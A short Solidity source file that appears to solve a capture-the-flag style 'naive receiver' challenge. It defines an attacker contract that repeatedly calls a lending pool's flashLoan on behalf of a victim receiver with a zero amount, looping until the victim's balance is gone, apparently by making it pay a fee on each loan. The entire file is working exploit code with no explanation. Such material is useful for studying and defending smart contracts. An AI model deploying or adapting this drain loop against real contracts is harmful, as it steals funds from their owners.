// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


contract NaiveFlashLoanReceiverAttacker{
    function attack(address pool, address victim, address token) public{
        uint balance = victim.balance;
        bytes memory data = abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)", victim, token, 0, "");
        while (balance > 0){
            (bool success, ) = pool.call(data);
            if (!success){
                break;
            }
            balance = victim.balance;
        }
    }
}
